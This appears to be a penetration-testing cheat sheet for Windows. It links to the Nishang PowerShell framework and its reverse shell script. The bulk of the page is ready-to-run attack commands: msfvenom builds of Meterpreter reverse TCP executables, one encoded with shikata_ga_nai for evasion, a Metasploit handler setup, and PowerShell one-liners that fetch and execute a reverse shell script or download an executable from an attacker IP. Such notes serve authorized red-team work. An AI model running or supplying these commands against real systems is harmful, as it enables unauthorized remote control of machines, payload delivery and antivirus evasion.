# Window Tools/Resources

Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.

{% embed url="https://github.com/samratashok/nishang" %}

Powershell Reverse Shells

{% embed url="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" %}

### Quick Commands

```
// Basic Meterpreter Windows Shell
msfvenom -p windows/meterpreter/reverse_tcp -a x86 LHOST=10.17.30.151 LPORT=1234 -f exe -o shell.exe
// Encoder Meterpreter Windows Shell
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.17.30.151 LPORT=1234 -f exe -o shell.exe
//Setting up Handler
use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run


// Invoke PowerShell ReverseShell 
powershell iex (New-Object Net.WebClient).DownloadString('http://10.17.30.151/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.17.30.151 -Port 4444
// Powershell download file
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.17.30.151:8000/shell-name.exe','shell-name.exe')"
```
